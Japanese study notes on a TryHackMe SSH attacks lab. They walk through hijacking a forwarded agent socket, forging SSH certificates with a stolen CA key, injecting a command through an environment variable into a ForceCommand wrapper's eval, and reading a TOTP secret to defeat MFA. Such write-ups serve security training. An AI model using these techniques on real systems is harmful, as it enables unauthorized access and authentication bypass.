# SSH

https://tryhackme.com/room/sshattacks

## 設定

sshd_config

カンマとスペースで大きな違いがある点に注意。

```sh
# AND。順に要件を満たす必要がある。
AuthenticationMethods publickey,keyboard-interactive

# OR。どれか一つだけで認証される。
AuthenticationMethods publickey keyboard-interactive
```

## 転送エージェントソケット

Forwarded Socket は予測可能なパスに保存される

```
# OpenSSH 10.1 未満
/tmp/ssh-XXXXXXXXXX/agent.<pid>

# OpenSSH 10.1 以降
~/.ssh/agent/
```

ユーザーXがマシンAからマシンBにSSH接続しているとする。  
ユーザーXの秘密鍵はマシンAの中にある。  
攻撃者がマシンBのroot権限を持っている場合、セッションを乗っ取り、ユーザーXとして他のマシンに認証できる。  
→　中間ホストの root 権限が必要

1. 転送エージェントソケットを見つける

```sh
root@relay01:~# ls /tmp/ssh-*/agent.*
/tmp/ssh-dMWHjcNELeEc/agent.5
```

2. ソケットを乗っ取る

```sh
root@relay01:~# export SSH_AUTH_SOCK=/tmp/ssh-dMWHjcNELeEc/agent.51
root@relay01:~# ssh-add -l
256 SHA256:rUJEoXPYoapRuQHKhXkFFd5mkaKWiZS7mLrmktn8NM4 ops-admin-key (ED25519)
```

ops-admin-key の部分が、ops-admin アカウントの署名機能を持っていることを示している。

3. 乗っ取られたエージェントを介して認証する

```sh
root@relay01:~# ssh -o StrictHostKeyChecking=no ops-admin@vault01
ops-admin@vault01:~$ 
```

## CA秘密鍵の悪用

証明書トラストの仕組み

```sh
# sshd に対して、その CA 鍵で署名された証明書を信頼するように指示
TrustedUserCAKeys /etc/ssh/northpeak_user_ca.pub

# 証明書のプリンシパルが、AuthorizedPrincipalsFile エントリと一致する必要がある
AuthorizedPrincipalsFile
```



CAの秘密鍵 northpeak_user_ca を入手できたとする。  
鍵のほかに、正確なプリンシパル名が必要。ウォークスルーではREADMEから入手した設定。

```sh
chmod 600 northpeak_user_ca
```

1. 攻撃者キーペアを生成

```sh
ssh-keygen -t ed25519 -f attacker_key -N ""
```

2. 攻撃者公開鍵に署名

```sh
ssh-keygen -s northpeak_user_ca -I pivot-access -n fleet-engineer -V +52w -z 31337 attacker_key.pub

# 内容確認
ssh-keygen -L -f attacker_key-cert.pub
```

証明書 attacker_key-cert.pub が生成される。  
署名コマンドは下記の形で、principal は完全一致の正確な文字列である必要がある。

```sh
ssh-keygen -s <ca-key> -I <identity> -n <principal> -V <validity> <user-public-key>
```

3. 攻撃者秘密鍵と証明書を使って接続

```sh
ssh -o StrictHostKeyChecking=no -i attacker_key -o CertificateFile=attacker_key-cert.pub svc-fleet@vault01
```

補足。svc-fleetユーザーとfleet-engineerプリンシパルの間に下記の紐づけがされているとする。

```sh
svc-fleet@vault01:~$ grep -R fleet-engineer /etc/ssh/* 2>/dev/null
/etc/ssh/auth_principals/svc-fleet:fleet-engineer
```

## ForceCommand

認証を得たが何も実行できないアカウントがあるとする。

```sh
root@relay01:~# ssh -i /root/svc_pipeline_id_ed25519 svc-pipeline@deploy01
Unsupported command
Connection to deploy01 closed.
root@relay01:~# ssh -i /root/svc_pipeline_id_ed25519 svc-pipeline@deploy01 whoami
Unsupported command
```

ForceCommand で下記のスクリプトが固定で実行されているとする。

```sh
#!/bin/bash
# /opt/ci/pipeline-wrapper.sh
STAGE="${PIPELINE_STAGE:-default}"
case "$SSH_ORIGINAL_COMMAND" in
  "status")
    eval "echo Running pipeline status check for stage: $STAGE"
    ;;
  "sync")
    eval "echo Syncing artifacts for stage: $STAGE"
    /opt/ci/bin/sync-artifacts.sh
    ;;
  *)
    echo "Unsupported command"
    exit 1
    ;;
esac
```

sshd_config

```sh
# deploy01:/etc/ssh/sshd_config
Match User svc-pipeline
    ForceCommand /opt/ci/pipeline-wrapper.sh
    AcceptEnv PIPELINE_STAGE
```

エクスプロイト。うまくいかない場合は、環境変数設定とSSH実行を別の行に分けることを考える。

```sh
PIPELINE_STAGE='default; id > /tmp/escape_confirmed.txt; cat /opt/ci/confirmed.flag #' \
  ssh -o SendEnv=PIPELINE_STAGE -i /root/svc_pipeline_id_ed25519 svc-pipeline@deploy01 status
```

## TOTPベースのMFA

```sh
root@relay01:~# ssh netops@edge01
(netops@edge01) Verification code: 
```

RFC 6238のTOTPアルゴリズムは、有効な6桁のコードを再現するために共有シークレットと現在時刻のみを必要とするため、必要なのはシークレット。

検索

```sh
find / -iname .google_authenticator 2>/dev/null
```

```sh
root@relay01:~# cat /opt/backups/netops-mfa/.google_authenticator
J2BXHEGUNUNAUUES
" RATE_LIMIT 3 30 1721905000
" WINDOW_SIZE 3
" DISALLOW_REUSE
" TOTP_AUTH
```

```sh
root@relay01:~# oathtool --totp -b J2BXHEGUNUNAUUES
891569
```


